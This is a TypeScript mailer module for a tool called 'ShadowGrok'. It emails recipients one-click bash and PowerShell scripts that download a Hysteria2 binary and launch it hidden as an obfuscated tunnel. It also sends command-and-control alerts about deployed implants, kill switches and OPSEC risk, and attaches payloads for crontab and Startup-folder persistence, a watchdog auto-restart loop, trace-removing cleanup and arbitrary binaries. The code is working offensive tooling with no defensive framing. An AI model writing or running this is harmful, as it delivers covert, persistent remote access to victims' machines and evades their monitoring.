/**
 * ShadowGrok Mailer
 * Sends hidden Hysteria2 tunnel scripts, subscription links, and C2 notifications.
 * Supports HTML + text emails with script attachments or inline one-liners.
 */

import nodemailer from 'nodemailer';
import { prisma } from '@/lib/db';

export interface PayloadAttachment {
  filename: string;
  content: string | Buffer;
  contentType?: string;
  description?: string;
}

interface SendTunnelScriptOptions {
  to: string;
  subject?: string;
  tunnelType?: 'hysteria2' | 'hysteria2-obfs' | 'multi-hop';
  platform?: 'linux' | 'windows' | 'macos' | 'all';
  stealthLevel?: 'standard' | 'high' | 'maximum';
  nodeId?: string;
  customConfig?: any;
  expiresInHours?: number;
  payloads?: PayloadAttachment[];
}

interface SendNotificationOptions {
  to: string;
  type: 'implant_deployed' | 'kill_switch_triggered' | 'new_subscription' | 'opsec_alert';
  data: Record<string, any>;
}

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.resend.com',
  port: Number(process.env.SMTP_PORT) || 587,
  secure: false,
  auth: {
    user: process.env.SMTP_USER || 'resend',
    pass: process.env.RESEND_API_KEY || process.env.SMTP_PASS,
  },
});

export async function sendHiddenHysteriaTunnelScript(options: SendTunnelScriptOptions) {
  const {
    to,
    subject = 'Your Secure Tunnel Access',
    tunnelType = 'hysteria2-obfs',
    platform = 'all',
    stealthLevel = 'high',
    nodeId,
    customConfig,
    expiresInHours = 72,
    payloads = [],
  } = options;

  // Generate hidden tunnel script
  const script = await generateHiddenTunnelScript({
    tunnelType,
    platform,
    stealthLevel,
    nodeId,
    customConfig,
    expiresInHours,
    payloads,
  });

  // Build payload section for HTML email
  let payloadSection = '';
  if (payloads.length > 0) {
    payloadSection = `
        <div style="background: #1a1a1a; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="margin: 0 0 12px; color: #f90;">📦 Attached Payloads (${payloads.length})</h3>
          <ul style="margin: 8px 0; padding-left: 20px; color: #aaa;">
            ${payloads.map(p => `<li style="margin: 4px 0;"><strong>${p.filename}</strong>${p.description ? ` - ${p.description}` : ''}</li>`).join('')}
          </ul>
        </div>`;
  }

  const html = `
    <div style="font-family: system-ui, sans-serif; max-width: 620px; margin: 0 auto; padding: 24px; background: #0a0a0a; color: #ddd;">
      <div style="background: #111; border-radius: 12px; padding: 32px; border: 1px solid #333;">
        <h1 style="color: #fff; margin: 0 0 8px;">ShadowGrok Secure Tunnel</h1>
        <p style="color: #888; margin: 0 0 24px;">Expires in ${expiresInHours} hours • Stealth Level: ${stealthLevel}</p>
        
        <div style="background: #1a1a1a; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="margin: 0 0 12px; color: #0f0;">One-Click Tunnel Script</h3>
          <pre style="background: #000; padding: 16px; border-radius: 6px; overflow-x: auto; font-size: 13px; color: #0f0; white-space: pre-wrap;">${script.bash}</pre>
        </div>

        ${platform === 'windows' || platform === 'all' ? `
        <div style="background: #1a1a1a; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="margin: 0 0 12px; color: #0af;">Windows (PowerShell)</h3>
          <pre style="background: #000; padding: 16px; border-radius: 6px; overflow-x: auto; font-size: 13px; color: #0af; white-space: pre-wrap;">${script.powershell}</pre>
        </div>` : ''}

        ${payloadSection}

        <div style="margin-top: 32px; font-size: 13px; color: #666;">
          <strong>Security Notice:</strong> This script establishes a covert Hysteria2 QUIC tunnel. 
          Do not share. Run in a clean environment. Tunnel self-destructs after ${expiresInHours}h.
        </div>
      </div>
    </div>
  `;

  // Combine script attachments with payload attachments
  const allAttachments = [
    ...script.attachments,
    ...payloads.map(p => ({
      filename: p.filename,
      content: p.content,
      contentType: p.contentType || 'application/octet-stream',
    }))
  ];

  const info = await transporter.sendMail({
    from: process.env.MAIL_FROM || '"ShadowGrok" <tunnel@shadowgrok.local>',
    to,
    subject,
    html,
    text: `ShadowGrok Hidden Tunnel Script\n\n${script.bash}\n\nExpires: ${expiresInHours}h\n\nAttached Payloads: ${payloads.map(p => p.filename).join(', ')}`,
    attachments: allAttachments,
  });

  // Log email
  await prisma.emailLog.create({
    data: {
      to,
      subject,
      type: 'tunnel_script',
      tunnelType,
      nodeId,
      messageId: info.messageId,
      sentAt: new Date(),
    }
  });

  return { success: true, messageId: info.messageId, attachmentsCount: allAttachments.length };
}

async function generateHiddenTunnelScript(params: any) {
  const { tunnelType, platform, stealthLevel, nodeId, expiresInHours, payloads = [] } = params;

  // In real implementation: fetch node config from DB and obfuscate
  const node = nodeId ? await prisma.hysteriaNode.findUnique({ where: { id: nodeId } }) : null;
  const server = 'your-hysteria-server.com:443';
  const password = 'shadowgrok-' + Date.now();
  const obfs = stealthLevel === 'maximum' ? 'salamander' : 'xor';

  const bash = `#!/bin/bash
# ShadowGrok Hidden Hysteria2 Tunnel (Stealth: ${stealthLevel})
# Auto-expires in ${expiresInHours}h

curl -fsSL https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o /tmp/h2 && chmod +x /tmp/h2

cat > /tmp/h2.conf <<EOF
server: ${server}
auth: ${password}
obfs:
  type: ${obfs}
  password: ${password}
quic:
  congestion: bbr
  initialStreamReceiveWindow: 8388608
bandwidth:
  up: 100 mbps
  down: 100 mbps
EOF

/tmp/h2 client -c /tmp/h2.conf --log-level warn &
echo "Tunnel active on SOCKS5 127.0.0.1:1080 (expires in ${expiresInHours}h)"
`;

  const powershell = `# ShadowGrok Hidden Hysteria2 Tunnel (Windows)
# Stealth Level: ${stealthLevel}

$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "https://github.com/apernet/hysteria/releases/latest/download/hysteria-windows-amd64.exe" -OutFile "$env:TEMP\\h2.exe"

@"
server: ${server}
auth: ${password}
obfs:
  type: ${obfs}
  password: ${password}
"@ | Out-File "$env:TEMP\\h2.yaml"

Start-Process -FilePath "$env:TEMP\\h2.exe" -ArgumentList "client -c $env:TEMP\\h2.yaml" -WindowStyle Hidden
Write-Host "Hidden tunnel established on 127.0.0.1:1080" -ForegroundColor Green
`;

  return {
    bash: bash.trim(),
    powershell: powershell.trim(),
    attachments: [
      {
        filename: 'shadowgrok-tunnel.sh',
        content: bash,
        contentType: 'text/x-sh',
      },
    ],
  };
}

export async function sendC2Notification(options: SendNotificationOptions) {
  const { to, type, data } = options;

  let subject = '';
  let html = '';

  switch (type) {
    case 'implant_deployed':
      subject = `🟢 New Implant Deployed: ${data.implantId}`;
      html = `<p>Implant <strong>${data.implantId}</strong> successfully deployed to node <strong>${data.nodeId}</strong>.</p>`;
      break;
    case 'kill_switch_triggered':
      subject = `🔴 Kill Switch Activated`;
      html = `<p>Kill switch triggered for ${data.scope}. Reason: ${data.reason}</p>`;
      break;
    case 'opsec_alert':
      subject = `⚠️ OPSEC Alert - Risk Score ${data.riskScore}`;
      html = `<p>High risk detected: ${data.message}</p>`;
      break;
  }

  await transporter.sendMail({
    from: process.env.MAIL_FROM || '"ShadowGrok Alerts" <alerts@shadowgrok.local>',
    to,
    subject,
    html,
  });

  await prisma.emailLog.create({
    data: {
      to,
      subject,
      type: 'notification',
      notificationType: type,
      sentAt: new Date(),
    }
  });
}

// ============================================================
// Payload Helpers - Common payload types for tunnel configs
// ============================================================

/**
 * Create a simple configuration file payload
 */
export function createConfigPayload(filename: string, config: Record<string, any>, description?: string): PayloadAttachment {
  return {
    filename,
    content: JSON.stringify(config, null, 2),
    contentType: 'application/json',
    description: description || 'Configuration file',
  };
}

/**
 * Create a setup script payload
 */
export function createSetupScriptPayload(commands: string[], platform: 'linux' | 'windows' = 'linux', description?: string): PayloadAttachment {
  const shebang = platform === 'linux' ? '#!/bin/bash' : '# PowerShell script';
  const content = platform === 'linux' 
    ? `${shebang}\n${commands.join('\n')}`
    : `${shebang}\n$ProgressPreference = 'SilentlyContinue'\n${commands.join('\n')}`;
  
  return {
    filename: platform === 'linux' ? 'setup.sh' : 'setup.ps1',
    content,
    contentType: platform === 'linux' ? 'text/x-sh' : 'text/plain',
    description: description || 'Setup script',
  };
}

/**
 * Create a payload with environment variables
 */
export function createEnvPayload(envVars: Record<string, string>, description?: string): PayloadAttachment {
  const content = Object.entries(envVars)
    .map(([key, value]) => `export ${key}="${value}"`)
    .join('\n');
  
  return {
    filename: '.env.payload',
    content: `# Environment Variables\n${content}`,
    contentType: 'text/plain',
    description: description || 'Environment variables',
  };
}

/**
 * Create a README/documentation payload
 */
export function createReadmePayload(content: string, description?: string): PayloadAttachment {
  return {
    filename: 'README.md',
    content: `# Tunnel Configuration Documentation\n\n${content}`,
    contentType: 'text/markdown',
    description: description || 'Documentation',
  };
}

/**
 * Create a binary payload (base64 encoded)
 */
export function createBinaryPayload(filename: string, base64Data: string, description?: string): PayloadAttachment {
  return {
    filename,
    content: Buffer.from(base64Data, 'base64'),
    contentType: 'application/octet-stream',
    description: description || 'Binary payload',
  };
}

/**
 * Predefined payload templates for common use cases
 */
export const PayloadTemplates = {
  /**
   * Persistence payload - adds tunnel to system startup
   */
  persistence: (platform: 'linux' | 'windows' = 'linux'): PayloadAttachment => {
    if (platform === 'linux') {
      return createSetupScriptPayload([
        '# Add to crontab for persistence',
        '(crontab -l 2>/dev/null; echo "@reboot /tmp/h2 client -c /tmp/h2.conf --log-level warn") | crontab -',
      ], 'linux', 'Auto-start configuration');
    } else {
      return createSetupScriptPayload([
        '# Add to Windows startup',
        '$WshShell = New-Object -comObject WScript.Shell',
        '$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h2.lnk")',
        '$Shortcut.TargetPath = "$env:TEMP\\h2.exe"',
        '$Shortcut.Arguments = "client -c $env:TEMP\\h2.yaml"',
        '$Shortcut.Save()',
      ], 'windows', 'Windows persistence script');
    }
  },

  /**
   * Monitoring payload - adds basic monitoring and logging
   */
  monitoring: (): PayloadAttachment => {
    return createSetupScriptPayload([
      '# Create monitoring script',
      'cat > /tmp/monitor.sh << EOF',
      '#!/bin/bash',
      'while true; do',
      '  if ! pgrep -f "h2 client" > /dev/null; then',
      '    echo "$(date): Tunnel restarted" >> /tmp/h2.log',
      '    /tmp/h2 client -c /tmp/h2.conf --log-level warn &',
      '  fi',
      '  sleep 60',
      'done',
      'EOF',
      'chmod +x /tmp/monitor.sh',
      'nohup /tmp/monitor.sh > /dev/null 2>&1 &',
    ], 'linux', 'Monitoring and auto-restart script');
  },

  /**
   * Cleanup payload - removes all traces after expiration
   */
  cleanup: (platform: 'linux' | 'windows' = 'linux'): PayloadAttachment => {
    if (platform === 'linux') {
      return createSetupScriptPayload([
        '# Cleanup script - run after tunnel expiration',
        'pkill -f "h2 client"',
        'rm -f /tmp/h2 /tmp/h2.conf /tmp/monitor.sh',
        'crontab -l | grep -v "h2" | crontab -',
        'echo "Cleanup complete"',
      ], 'linux', 'Cleanup script');
    } else {
      return createSetupScriptPayload([
        '# Windows cleanup script',
        'Stop-Process -Name "h2" -Force -ErrorAction SilentlyContinue',
        'Remove-Item "$env:TEMP\\h2.exe" -Force -ErrorAction SilentlyContinue',
        'Remove-Item "$env:TEMP\\h2.yaml" -Force -ErrorAction SilentlyContinue',
        'Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h2.lnk" -Force -ErrorAction SilentlyContinue',
        'Write-Host "Cleanup complete"',
      ], 'windows', 'Windows cleanup script');
    }
  },

  /**
   * Documentation payload - usage instructions
   */
  documentation: (): PayloadAttachment => {
    return createReadmePayload(
      `## Usage Instructions

### Quick Start
1. Save the tunnel script to your system
2. Make it executable: \`chmod +x shadowgrok-tunnel.sh\`
3. Run it: \`./shadowgrok-tunnel.sh\`

### Verification
- Check if tunnel is running: \`ps aux | grep h2\`
- Test connection: \`curl --socks5 127.0.0.1:1080 https://api.ipify.org\`

### Configuration
- Config file location: \`/tmp/h2.conf\`
- Log file location: \`/tmp/h2.log\`
- Default port: SOCKS5 on 127.0.0.1:1080

### Troubleshooting
- If connection fails, check your firewall settings
- Ensure port 443 is not blocked
- Verify the server address is correct

### Security Notes
- This tunnel uses obfuscation to avoid detection
- Traffic appears as normal HTTPS
- Auto-expires after the configured time limit
- Always run in a secure environment`,
      'Usage documentation'
    );
  },
};